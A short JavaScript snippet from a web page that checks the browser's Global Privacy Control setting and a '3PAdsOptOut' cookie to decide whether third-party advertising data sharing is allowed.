    const globalPrivacyControlEnabled = navigator.globalPrivacyControl;

    const GPC_DataSharingOptIn = (globalPrivacyControlEnabled) ? false : checkThirdPartyAdsOptOutCookie();

    if(window.onGPCLoaded) {
        window.onGPCLoaded();
    }
    
    function checkThirdPartyAdsOptOutCookie() {
        try {
            const ThirdPartyAdsOptOutCookieName = '3PAdsOptOut';
            var cookieValue = getCookie(ThirdPartyAdsOptOutCookieName);
            return cookieValue != 1;
        } catch {
            return true;
        }
    }

    function getCookie(cookieName) {
        var cookieValue = document.cookie.match('(^|;)\\s*' + cookieName + '\\s*=\\s*([^;]+)');
        return (cookieValue) ? cookieValue[2] : '';
    }
</script>
